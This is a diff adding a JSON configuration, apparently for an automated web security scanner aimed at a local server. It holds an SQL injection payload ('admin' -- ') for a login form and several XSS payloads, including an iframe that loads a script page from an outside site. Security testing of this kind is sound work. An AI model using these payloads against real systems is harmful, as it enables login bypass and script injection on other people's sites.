@@ -1,0 +1,147 @@
+{
+	"domain": "http://0.0.0.0:8081",
+	"exploits": [
+		{
+			"name": "SQL Injection",
+			"path": "/login",
+			"expected": "redirect",
+			"search_for": [
+				{
+					"tag": "input",
+					"compulsory_attributes": [
+						{
+							"key": "type",
+							"value": "text"
+						}
+					],
+					"possible_attributes": [
+						{
+							"key": "placeholder",
+							"value": ["username", "name", "email", "phone"]
+						},
+						{
+							"key": "class",
+							"value": ["username", "name", "email", "phone"]
+						},
+						{
+							"key": "id",
+							"value": ["username", "name", "email", "phone"]
+						},
+						{
+							"key": "name",
+							"value": ["username", "name", "email", "phone"]
+						}
+					],
+					"action": "fill",
+					"fill_with": [
+						"admin' -- "
+					]
+				},
+				{
+					"tag": "input",
+					"compulsory_attributes": [
+						{
+							"key": "type",
+							"value": "password"
+						}
+					],
+					"possible_attributes": [
+						{
+							"key": "placeholder",
+							"value": ["password"]
+						},
+						{
+							"key": "class",
+							"value": ["password"]
+						},
+						{
+							"key": "id",
+							"value": ["password"]
+						},
+						{
+							"key": "name",
+							"value": ["password"]
+						}
+					],
+					"action": "fill",
+					"fill_with": ["some_random_password"]
+				},
+				{
+					"tag": ["input", "button"],
+					"compulsory_attributes": [
+						{
+							"key": "type",
+							"value": "submit"
+						}
+					],
+					"possible_attributes": [
+						{
+							"key": "class",
+							"value": ["submit"]
+						},
+						{
+							"key": "id",
+							"value": ["submit"]
+						},
+						{
+							"key": "name",
+							"value": ["submit"]
+						},
+						{
+							"key": "value",
+							"value": ["Sign In", "Login", "Log In"]
+						}
+					],
+					"action": "click"
+				}
+			]
+		},
+		{
+			"name": "XSS",
+			"path": "/",
+			"expected": "alert",
+			"search_for": [
+				{
+					"tag": ["input", "textarea"],
+					"compulsory_attributes": [],
+					"possible_attributes": [
+						{
+							"key": "name",
+							"value": "message"
+						}
+					],
+					"action": "fill",
+					"fill_with": [
+						"<img src=\"image.gif\" onerror=\"alert(2)\">",
+						"<iframe src=http://xss.rocks/scriptlet.html></iframe>",
+						"<script>alert(1)</script>"
+					]
+				},
+				{
+					"tag": ["input", "button"],
+					"compulsory_attributes": [
+						{
+							"key": "type",
+							"value": "submit"
+						}
+					],
+					"possible_attributes": [
+						{
+							"key": "class",
+							"value": ["submit"]
+						},
+						{
+							"key": "id",
+							"value": ["submit"]
+						},
+						{
+							"key": "name",
+							"value": ["submit"]
+						}
+					],
+					"action": "click"
+				}
+			]
+		}
+	]
+}
